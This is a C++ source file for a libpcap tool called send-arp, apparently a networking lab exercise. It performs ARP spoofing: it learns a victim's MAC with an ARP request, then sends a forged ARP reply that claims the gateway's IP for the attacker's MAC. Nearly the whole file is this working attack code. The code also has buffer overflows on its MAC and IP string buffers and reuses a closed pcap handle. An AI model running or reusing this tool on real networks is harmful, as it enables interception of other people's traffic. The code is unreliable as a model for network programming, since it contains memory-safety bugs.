#include <cstdio>
#include <pcap.h>
#include "ip.h"
#include "mac.h"
#include "ethhdr.h"
#include "arphdr.h"
#include "net/if.h"
#include "net/if_arp.h"
#include "arphdr.h"
#include "sys/ioctl.h"
#include "stdio.h"
#include "sys/socket.h"
#include "unistd.h"
#include "arpa/inet.h"

#define IP_ALEN 20
#define MAC_ALEN 6
#define MAC_FMT "%02X:%02X:%02X:%02X:%02X:%02X"
#define MAC_ARGS(my_mac) my_mac[0],my_mac[1],my_mac[2],my_mac[3],my_mac[4],my_mac[5]



//#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
//#pragma pack(pop)

void usage() {
    printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}


struct libnet_ethernet_hdr
{
    u_int8_t ether_dhost[MAC_ALEN];
    u_int8_t ether_shost[MAC_ALEN];
    u_int16_t ether_type;
};

int Get_My_Ip_Addr(char *ip_buffer)
{
    int fd;
    struct ifreq ifr;

    fd = socket(AF_INET, SOCK_DGRAM, 0);

    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, "eth0", IFNAMSIZ -1);

    ioctl(fd, SIOCGIFADDR, &ifr);
    close(fd);

    sprintf(ip_buffer, "%s", inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));

    return 0;
}


int My_MacAddress(const char *ifname, char *mac_addr)
{
    struct ifreq ifr;
    int sockfd, ret;

//----------------------------------------------------------------------------Open Net interface socket
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if(sockfd < 0) {
        printf("Fail to get interface MAC address - socket() failed - %m\n");
        return -1;
    }
//----------------------------------------------------------------------------check the Mac Address of Net interface
    strncpy(ifr.ifr_name, ifname, IFNAMSIZ);
    ret = ioctl(sockfd, SIOCGIFHWADDR, &ifr);
    if (ret < 0) {
        printf("Fail to get interface Mac address - ioctl(SIOCSIFHWADDR) failed - %m\n");
        close(sockfd);
        return 0;
    }
    memcpy(mac_addr, ifr.ifr_hwaddr.sa_data, MAC_ALEN);

//-----------------------------------------------------------------------------Close interface socket
    close(sockfd);
    printf("Close Socket OK\n");
    return 1;
}



void Send_ARPRequest(pcap_t *handle, char * my_ip , char *victim_IP, char *my_mac) // (Hacker -> Victim) for catch the victim's MacAddress
{

    EthArpPacket packet;

    packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF"); // victim Mac - Broad Cast
    packet.eth_.smac_ = Mac(my_mac); // Hacker's Mac - internet search
    packet.eth_.type_ = htons(EthHdr::Arp);
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = Mac(my_mac); // Hacker's Mac - internet search
    packet.arp_.sip_ = htonl(Ip(my_ip));      //Hacker's IP
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00"); //victim Mac
    packet.arp_.tip_ = htonl(Ip(victim_IP)); //argv[3]

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        exit(1);
    }
    pcap_close(handle);

}

void ARP_Spoofing(pcap_t *handle, char * victim_Mac ,char *victim_IP, char * target_ip ,char *my_mac) // ARP Spoofing
{

    EthArpPacket packet;

    packet.eth_.dmac_ = Mac(victim_Mac); // victim Mac
    packet.eth_.smac_ = Mac(my_mac); // Hacker's Mac
    packet.eth_.type_ = htons(EthHdr::Arp);
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = Mac(my_mac); // Hacker's Mac
    packet.arp_.sip_ = htonl(Ip(target_ip));      // GateWay IP
    packet.arp_.tmac_ = Mac(victim_Mac); //victim Mac
    packet.arp_.tip_ = htonl(Ip(victim_IP)); //Victim IP

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
    pcap_close(handle);

}




int main(int argc, char* argv[]) {
    if (argc != 4) {
		usage();
		return -1;
	}
    char* dev = argv[1]; //<interface>
    char* victim_ip = argv[2]; // victim ip
    char* target_ip = argv[3]; //gateway ip

    char my_mac[6]; //mac size 6
    char my_ip[6];



    My_MacAddress(dev, my_mac); // mac_addr
    sprintf(my_mac,MAC_FMT, MAC_ARGS(my_mac)); //my mac save
    printf("My_MacAddress OK\n");
    Get_My_Ip_Addr(my_ip); // ip_addr
    printf("My_IPAddress OK\n");


    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, 0, 0, 1000, errbuf);//pcap send handle
    if (handle == nullptr)
    {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    pcap_t* reply_handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);//pcap reply handle promisc packet
    if (reply_handle == nullptr)
    {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    //GetInterfaceMACAddress_you(reply_handle, victim_Mac);
    Send_ARPRequest(handle, my_ip, victim_ip, my_mac);
    printf("Send_ARPRequest OK\n");

while(1){
    sleep(1);
    struct pcap_pkthdr* header;
    const u_char* reply_packet;
    int res = pcap_next_ex(reply_handle,&header,&reply_packet);
    if(res==0)continue;
    if(res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
    {
        printf("pcap_next_ex ERROR");
        return 0;
        break;
    }

    struct libnet_ethernet_hdr* reply = (struct libnet_ethernet_hdr*) reply_packet;
                if(ntohs(reply->ether_type) == 0x0806)
                {
                    char victim_Mac[20];
                    char test_Mac[20];
                    printf("My Ip ADDR -> %s\n", my_ip);
                    printf("Victim MAC ADDR -> %s\n", victim_Mac);
                    sprintf(victim_Mac, MAC_FMT, reply->ether_shost[0], reply->ether_shost[1], reply->ether_shost[2], reply->ether_shost[3], reply->ether_shost[4], reply->ether_shost[5]);
                    sprintf(test_Mac,MAC_FMT, reply->ether_dhost[0], reply->ether_dhost[1], reply->ether_dhost[2], reply->ether_dhost[3], reply->ether_dhost[4], reply->ether_dhost[5]);
                    printf("test MAC ADDR -> %s\n", test_Mac);
                    printf("Victim MAC ADDR -> %s\n", victim_Mac);
                    printf("Victim_ip -> %s\n",victim_ip);
                    printf("target_ip -> %s\n",target_ip);

                    printf("My MAC ADDR -> %s\n",my_mac);
                    ARP_Spoofing(handle, victim_Mac, victim_ip, target_ip, my_mac);
                    printf("SUCCESS!\n");
                   }
}





    printf("ARP-SPOOFING...OK!\n");







}
